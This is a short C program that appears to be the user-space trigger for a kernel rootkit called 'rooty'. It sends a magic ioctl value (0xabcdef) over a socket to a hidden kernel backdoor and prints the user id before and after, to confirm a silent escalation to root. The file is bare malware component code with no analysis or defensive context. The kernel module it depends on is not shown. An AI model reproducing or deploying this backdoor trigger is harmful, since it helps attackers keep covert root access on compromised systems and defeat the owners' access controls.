#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>


#define AUTH_TOKEN 0xabcdef

struct rooty_args
{
    unsigned short cmd;
    void *ptr;
};

int main ( int argc, char *argv[] )
{
    struct rooty_args rooty_args;
    int sockfd;
    int io;

    sockfd = socket(AF_INET, SOCK_STREAM, 6);

    rooty_args.cmd = 0;
    uid_t curr_uid =  getuid();
    printf("curr_uid : %d\n", curr_uid);

    printf("sent root cmd\n");
    io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    sleep(2);
    curr_uid =  getuid();
    printf("curr_uid : %d\n", curr_uid);
    printf("bye..\n");
}
